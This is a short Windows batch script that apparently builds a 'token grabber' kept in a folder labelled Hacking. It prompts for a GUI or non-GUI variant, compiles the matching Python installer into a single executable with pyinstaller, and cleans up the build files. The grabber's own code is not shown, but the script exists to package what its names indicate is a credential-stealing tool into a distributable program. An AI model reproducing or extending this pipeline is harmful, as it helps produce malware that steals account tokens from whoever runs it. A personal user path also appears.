@ECHO OFF

:choice
set /P c=Do you want to include a starting GUI? [Y/N]?
if /I "%c%" EQU "Y" goto :with
if /I "%c%" EQU "N" goto :without
goto :choice


:with
cd C:\Users\ethan\Documents\Tools\Hacking\tokengrabber
pyinstaller --onefile GUIGrabberInstaller.py
@RD /S /Q "build"
@RD /S /Q "__pycache__"
del GUIGrabberInstaller.spec
exit

:without
cd C:\Users\ethan\Documents\Tools\Hacking\tokengrabber
pyinstaller --onefile NOGUIGrabberInstaller.py
@RD /S /Q "build"
@RD /S /Q "__pycache__"
del NOGUIGrabberInstaller.spec
exit
